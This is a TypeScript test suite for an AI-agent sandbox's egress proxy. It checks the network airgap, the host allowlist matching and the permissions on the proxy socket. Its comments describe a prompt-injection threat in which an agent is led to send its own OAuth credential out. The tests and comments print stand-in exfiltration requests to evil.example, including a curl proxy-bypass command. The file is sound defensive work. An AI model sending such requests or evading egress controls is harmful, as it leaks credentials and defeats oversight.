import { strict as assert } from 'node:assert'
import { connect } from 'node:net'
import { test } from 'node:test'
import { defaultEgressAllow, isHostAllowed, resolveEgressAllow } from '@ogun/core'
import { buildRunArgs, GUEST_WORKSPACE } from '../src/sandbox/container.ts'
import {
  egressSocketPath,
  GUEST_EGRESS_SOCKET,
  GUEST_PROXY_PORT,
  startEgressProxy,
} from '../src/sandbox/egress-proxy.ts'

/**
 * Egress was `open | none`, defaulting to `open`, while §4.6 specified a host allowlist
 * and §9 recorded the gap as an open question. `open` is unrestricted internet, and
 * `credentialMounts()` puts a live OAuth credential into every sandbox — so the shipped
 * default was an agent that could read its own credential and POST it anywhere. The
 * motivating failure is not a malicious agent; it is prompt injection out of the
 * repository an `adversarial-review` worker is aimed at on purpose.
 *
 * Everything here is about what a container *cannot* do. A proxy that forwards is easy;
 * a proxy that refuses, and that cannot be walked around, is the whole point — so each
 * case below is a way the enforcement could be quietly hollow while still looking
 * configured.
 */

const argsFor = (over: Partial<Parameters<typeof buildRunArgs>[0]> = {}) =>
  buildRunArgs(
    {
      name: 'ogun-test',
      hostWorkspace: '/tmp/ws',
      guestWorkspace: GUEST_WORKSPACE,
      permissions: 'reviewer',
      runtime: 'claude',
      timeoutMs: 1000,
      image: 'ogun/base:latest',
      ...over,
    } as Parameters<typeof buildRunArgs>[0],
    'ogun/base:latest',
  )

const envOf = (args: string[], key: string): string | undefined =>
  args.find((a) => a.startsWith(`${key}=`))?.slice(key.length + 1)

const flagValues = (args: string[], flag: string): string[] =>
  args.flatMap((a, i) => (args[i - 1] === flag ? [a] : []))

// ---------------------------------------------------------------------------
// The mechanism: --network none is the enforcement, the socket is the exception
// ---------------------------------------------------------------------------

/**
 * The property that makes this an allowlist rather than a suggestion.
 *
 * A forward proxy advertised through `HTTPS_PROXY` on a container that still has a
 * working network interface enforces nothing: `curl --noproxy '*' https://evil.example`
 * ignores the variable, and so does any library that was not written to read it. The
 * enforcement has to be the absence of a route, with the proxy as the only exception —
 * which is why the socket is a unix socket rather than a TCP listener the container can
 * reach some other way.
 */
test('an allowlisted container has no network at all — the proxy is the only route out', () => {
  const args = argsFor({ egress: ['example.com'], egressSocket: '/tmp/ogun-egress/x.sock' })
  assert.deepEqual(flagValues(args, '--network'), ['none'], 'the container must have no network')
  assert.ok(
    args.some((a) => a === `/tmp/ogun-egress/x.sock:${GUEST_EGRESS_SOCKET}`),
    'the proxy socket must be mounted in',
  )
})

/**
 * The socket is mounted as a *file*. `tmpdir()/ogun-egress` holds one socket per
 * concurrent run and a runner runs several at once, so mounting the directory would give
 * every container every other job's socket — and a worker with a narrow allowlist could
 * reach a wider one simply by connecting to a neighbour's.
 */
test('a container is mounted its own socket, not the directory holding every run\'s', () => {
  const args = argsFor({ egress: ['example.com'], egressSocket: egressSocketPath('ogun-abc') })
  const mount = args.find((a) => a.includes(GUEST_EGRESS_SOCKET))
  assert.ok(mount?.endsWith('ogun-abc.sock:' + GUEST_EGRESS_SOCKET), `mount was ${mount}`)
  assert.ok(!args.includes(`${egressSocketPath('ogun-abc').replace(/\/[^/]+$/, '')}:/run/ogun`))
})

/**
 * Failing closed when the runner's own lifecycle is wrong.
 *
 * `provision()` starts the proxy and sets `egressSocket`; if it did not run, the honest
 * options are "no network" or "unrestricted network". Choosing the second would let a bug
 * in the runner silently restore exactly the posture this change exists to remove, and it
 * would do so without a single log line.
 */
test('an allowlist with no proxy behind it is an airgap, never open internet', () => {
  const args = argsFor({ egress: ['example.com'] })
  assert.deepEqual(flagValues(args, '--network'), ['none'])
  assert.ok(!args.some((a) => a.includes(GUEST_EGRESS_SOCKET)), 'nothing to mount')
  assert.equal(envOf(args, 'HTTPS_PROXY'), undefined, 'no proxy to point at')
})

// ---------------------------------------------------------------------------
// Backward compatibility: the two spellings that shipped must keep working
// ---------------------------------------------------------------------------

test('`egress: none` is still a genuine airgap', () => {
  const args = argsFor({ egress: 'none', egressSocket: '/tmp/ogun-egress/x.sock' })
  assert.deepEqual(flagValues(args, '--network'), ['none'])
  assert.ok(!args.some((a) => a.includes(GUEST_EGRESS_SOCKET)), 'none mounts no escape hatch')
})

/** `open` stays available as an explicit opt-out — a project whose suite pulls from a
 *  dozen hosts needs an answer that is not "give up on egress control". It gets a normal
 *  bridge network and no proxy, exactly as before. */
test('`egress: open` is still unrestricted, and says nothing about a proxy', () => {
  const args = argsFor({ egress: 'open' })
  assert.deepEqual(flagValues(args, '--network'), [], 'open uses the default bridge')
  assert.equal(envOf(args, 'HTTPS_PROXY'), undefined)
})

/**
 * The default changed, and this is the assertion that says so. It used to be `open`.
 * A worker that names no egress now gets the allowlist, which is the case that had to be
 * shippable — no existing config mentions egress at all.
 */
test('a worker that declares no egress gets the allowlist, not the internet', () => {
  const args = argsFor({ egressSocket: '/tmp/ogun-egress/x.sock' })
  assert.deepEqual(flagValues(args, '--network'), ['none'])
  assert.ok(args.some((a) => a.includes(GUEST_EGRESS_SOCKET)))
})

// ---------------------------------------------------------------------------
// Proxy environment: both spellings, and loopback exempted
// ---------------------------------------------------------------------------

/**
 * There is no standard for these variables, only a convention with a hole in it. CGI maps
 * an inbound `Proxy:` header to `HTTP_PROXY`, so curl, Go's `net/http` and Rust's
 * `reqwest` deliberately ignore the uppercase form and read only `http_proxy`; other
 * clients read only the uppercase. `codex` is reqwest and `claude` is undici. Setting one
 * spelling would leave one runtime unproxied inside a `--network none` container — which
 * does not fail open, it fails as an agent that cannot reach its model API at 3am for a
 * reason nothing in the error mentions.
 */
test('both spellings of every proxy variable are set', () => {
  const args = argsFor({ egress: ['example.com'], egressSocket: '/tmp/ogun-egress/x.sock' })
  const expected = `http://127.0.0.1:${GUEST_PROXY_PORT}`
  for (const key of ['HTTP_PROXY', 'http_proxy', 'HTTPS_PROXY', 'https_proxy']) {
    assert.equal(envOf(args, key), expected, `${key} was not set to the in-container proxy`)
  }
})

/**
 * `NO_PROXY` must name loopback, in both spellings. The forwarder *is* on loopback, so
 * without the exemption a client that resolves the proxy's own address through the proxy
 * is asking it to CONNECT to itself. All three spellings of loopback, because which one a
 * client compares against depends on whether it normalises the host first — and the ones
 * that do not normalise are exactly the ones that would loop.
 */
test('both spellings of NO_PROXY exempt the container\'s own loopback', () => {
  const args = argsFor({ egress: ['example.com'], egressSocket: '/tmp/ogun-egress/x.sock' })
  for (const key of ['NO_PROXY', 'no_proxy']) {
    const value = envOf(args, key)
    assert.ok(value, `${key} was not set at all`)
    for (const local of ['localhost', '127.0.0.1', '::1']) {
      assert.ok(value.includes(local), `${key} does not exempt ${local}: ${value}`)
    }
  }
})

// ---------------------------------------------------------------------------
// The allowlist matcher
// ---------------------------------------------------------------------------

/**
 * What a naive wildcard gets wrong.
 *
 * Implementing `*.example.com` as `host.endsWith('example.com')` also matches
 * `notexample.com` and `example.com.evil.io`, either of which hands an attacker the whole
 * allowlist for the price of one domain registration. The suffix has to begin at a label
 * boundary. `notanthropic.com` was refused by a real container running this code, which
 * is the case that would otherwise have silently passed.
 */
test('a wildcard matches subdomains only, at a label boundary', () => {
  const allow = ['*.anthropic.com', 'anthropic.com', 'registry.npmjs.org']
  assert.ok(isHostAllowed('api.anthropic.com', allow))
  assert.ok(isHostAllowed('statsig.anthropic.com', allow))
  assert.ok(isHostAllowed('anthropic.com', allow), 'the parent is listed separately')
  assert.ok(isHostAllowed('registry.npmjs.org', allow))

  assert.ok(!isHostAllowed('notanthropic.com', allow), 'suffix must start at a label boundary')
  assert.ok(!isHostAllowed('anthropic.com.evil.example', allow), 'a prefix is not a match')
  assert.ok(!isHostAllowed('evil.example', allow))
  assert.ok(!isHostAllowed('npmjs.org', allow), 'a parent is not implied by its child')
})

/** Hosts arrive from a CONNECT line, where casing and the root's trailing dot are both
 *  legal and neither is meaningful. `API.Anthropic.Com.` is the same host as
 *  `api.anthropic.com`, and only one of them survives a naive string compare. */
test('host matching ignores case and the root dot', () => {
  assert.ok(isHostAllowed('API.Anthropic.Com.', ['*.anthropic.com']))
  assert.ok(isHostAllowed('Registry.NPMJS.org', ['registry.npmjs.org']))
})

/**
 * A declared list *adds to* the defaults rather than replacing them. Replacement would
 * let `egress: [registry.npmjs.org]` lock the agent runtime out of its own model API —
 * which does not produce a stricter worker, it produces one that cannot start, and it
 * fails at 3am rather than at parse time.
 */
test('a declared allowlist adds to the defaults instead of replacing them', () => {
  const allow = resolveEgressAllow(['proxy.golang.org'], 'claude')
  assert.ok(allow)
  assert.ok(allow.includes('proxy.golang.org'), 'the declared host is allowed')
  for (const host of defaultEgressAllow('claude')) {
    assert.ok(allow.includes(host), `the default ${host} survived a declaration`)
  }
})

/** The defaults are scoped to the runtime that is going to run, so a claude worker
 *  carries no OpenAI rule. Free — the runner knows the runtime before it builds the
 *  container — and it is the difference between an allowlist and a list. */
test('the defaults are scoped to the runtime that will actually run', () => {
  assert.ok(isHostAllowed('api.anthropic.com', defaultEgressAllow('claude')))
  assert.ok(!isHostAllowed('api.openai.com', defaultEgressAllow('claude')))
  assert.ok(isHostAllowed('api.openai.com', defaultEgressAllow('codex')))
  assert.ok(!isHostAllowed('api.anthropic.com', defaultEgressAllow('codex')))
})

/** `open` and `none` are not allowlists, and a caller has to branch on them anyway.
 *  Returning `[]` for `none` would be a second way of spelling "allow nothing" that a
 *  caller could mistake for "no policy configured". */
test('open and none resolve to no allowlist at all', () => {
  assert.equal(resolveEgressAllow('open', 'claude'), undefined)
  assert.equal(resolveEgressAllow('none', 'claude'), undefined)
})

// ---------------------------------------------------------------------------
// The proxy, for real
// ---------------------------------------------------------------------------

/**
 * The refusal, against a live socket rather than a mock.
 *
 * This starts the actual proxy and speaks the actual protocol at it, because the thing
 * being protected is a wire format: a CONNECT handler that returned the right verdict but
 * wrote a malformed response would pass any test of `isHostAllowed` and still hand the
 * container a tunnel. No network is needed — a refusal is decided before anything is
 * dialled, which is exactly why the refusal path is the one that can be tested offline.
 */
const speak = (socketPath: string, request: string): Promise<string> =>
  new Promise((resolvePromise, rejectPromise) => {
    const client = connect(socketPath, () => client.write(request))
    let out = ''
    client.on('data', (d: Buffer) => {
      out += d.toString()
      // The refusal closes the connection, but a test that waited for `end` would hang
      // forever on the day the proxy stops closing it.
      if (out.includes('\r\n\r\n')) {
        client.destroy()
        resolvePromise(out)
      }
    })
    client.on('error', rejectPromise)
    setTimeout(() => {
      client.destroy()
      rejectPromise(new Error(`proxy did not answer: ${JSON.stringify(out)}`))
    }, 5_000).unref()
  })

test('the proxy refuses CONNECT to a host that is not on the allowlist', async (t) => {
  const proxy = await startEgressProxy({
    containerName: `ogun-test-deny-${process.pid}`,
    allow: ['api.anthropic.com'],
  })
  t.after(() => proxy.close())

  const response = await speak(proxy.socketPath, 'CONNECT evil.example:443 HTTP/1.1\r\n\r\n')
  assert.match(response, /^HTTP\/1\.1 403 /, `expected a refusal, got: ${response}`)
  // The body is the only explanation anyone gets — it surfaces in curl's output and in an
  // agent's error message, where "ECONNREFUSED" would send someone hunting a network
  // fault that does not exist.
  assert.match(response, /evil\.example/, 'the refusal must name the host it refused')
  assert.match(response, /egress:/, 'and must say which subsystem refused it')
  assert.deepEqual(proxy.denied(), ['evil.example'], 'a refusal is recorded for the run log')
})

/** A lookalike is the case worth a dedicated test: it is the one a suffix match lets
 *  through, and the one an attacker can actually buy. */
test('the proxy refuses a host that merely looks like an allowlisted one', async (t) => {
  const proxy = await startEgressProxy({
    containerName: `ogun-test-lookalike-${process.pid}`,
    allow: ['*.anthropic.com', 'anthropic.com'],
  })
  t.after(() => proxy.close())

  for (const host of ['notanthropic.com', 'anthropic.com.evil.example']) {
    const response = await speak(proxy.socketPath, `CONNECT ${host}:443 HTTP/1.1\r\n\r\n`)
    assert.match(response, /^HTTP\/1\.1 403 /, `${host} should not have been allowed`)
  }
})

/** Plain HTTP is proxied in absolute form, and refused by the same allowlist. Supported
 *  rather than rejected outright because `http://` failing while `https://` worked is a
 *  difference nobody diagnoses correctly from inside a container. */
test('the proxy refuses plain HTTP to a host that is not on the allowlist', async (t) => {
  const proxy = await startEgressProxy({
    containerName: `ogun-test-http-${process.pid}`,
    allow: ['registry.npmjs.org'],
  })
  t.after(() => proxy.close())

  const response = await speak(
    proxy.socketPath,
    'GET http://evil.example/steal HTTP/1.1\r\nHost: evil.example\r\n\r\n',
  )
  assert.match(response, /^HTTP\/1\.1 403 /, `expected a refusal, got: ${response}`)
})

/** A request that is not in absolute form did not come from a proxy client, so there is
 *  no host to check. Guessing one from the `Host:` header would mean the allowlist could
 *  be steered by a header rather than by the connection's actual destination. */
test('the proxy refuses a request with no absolute URL to check', async (t) => {
  const proxy = await startEgressProxy({
    containerName: `ogun-test-origin-${process.pid}`,
    allow: ['registry.npmjs.org'],
  })
  t.after(() => proxy.close())

  const response = await speak(
    proxy.socketPath,
    'GET /steal HTTP/1.1\r\nHost: registry.npmjs.org\r\n\r\n',
  )
  assert.match(response, /^HTTP\/1\.1 403 /, `expected a refusal, got: ${response}`)
})

/** The socket is how the container reaches out, so its mode is part of the boundary.
 *  Connecting to a unix socket needs *write* permission, and any mode wider than 0600
 *  would make this an unauthenticated forward proxy for every local account on the host. */
test('the proxy socket is not connectable by other accounts on the host', async (t) => {
  const proxy = await startEgressProxy({
    containerName: `ogun-test-mode-${process.pid}`,
    allow: ['api.anthropic.com'],
  })
  t.after(() => proxy.close())

  const { stat } = await import('node:fs/promises')
  const mode = (await stat(proxy.socketPath)).mode & 0o777
  assert.equal(mode, 0o600, `socket mode was ${mode.toString(8)}`)
})

/** Closing has to remove the socket file. A leftover makes the next run with the same
 *  container name fail to listen with EADDRINUSE, which reads as "a proxy is already
 *  running" when nothing is. */
test('closing the proxy leaves no socket behind for the next run to trip over', async () => {
  const proxy = await startEgressProxy({
    containerName: `ogun-test-cleanup-${process.pid}`,
    allow: ['api.anthropic.com'],
  })
  const { existsSync } = await import('node:fs')
  assert.ok(existsSync(proxy.socketPath))
  await proxy.close()
  assert.ok(!existsSync(proxy.socketPath), 'the socket file outlived the proxy')
})
